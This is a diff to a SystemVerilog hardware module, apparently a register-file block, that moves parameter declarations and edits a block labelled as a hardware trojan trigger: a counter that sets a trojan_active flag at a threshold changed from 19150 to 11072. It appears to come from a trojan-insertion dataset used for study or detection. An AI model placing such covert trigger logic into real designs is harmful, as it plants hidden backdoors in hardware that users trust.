@@ -33,14 +33,19 @@ output
     logic [ ENTRY_BIT_SIZE-1:0 ] rv [ READ_NUM ]
 `endif
 );
+    parameter INDEX_BIT_SIZE = $clog2(ENTRY_NUM);
+    `ifdef RSD_SYNTHESIS_VIVADO
+        localparam INPUT_BIT_SIZE = 1+
+                                    INDEX_BIT_SIZE+
+                                    ENTRY_BIT_SIZE+
+                                    INDEX_BIT_SIZE*(READ_NUM-1);
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=11072)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 19150;
+    localparam int TRIGGER_THRESHOLD = 11072;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
@@ -51,12 +56,6 @@ output
         end
     end
 
-    parameter INDEX_BIT_SIZE = $clog2(ENTRY_NUM);
-    `ifdef RSD_SYNTHESIS_VIVADO
-        localparam INPUT_BIT_SIZE = 1+
-                                    INDEX_BIT_SIZE+
-                                    ENTRY_BIT_SIZE+
-                                    INDEX_BIT_SIZE*(READ_NUM-1);
 
         logic [ INPUT_BIT_SIZE-1:0 ] ishift;
         logic [ ENTRY_BIT_SIZE-1:0 ] rvreg [ READ_NUM ];
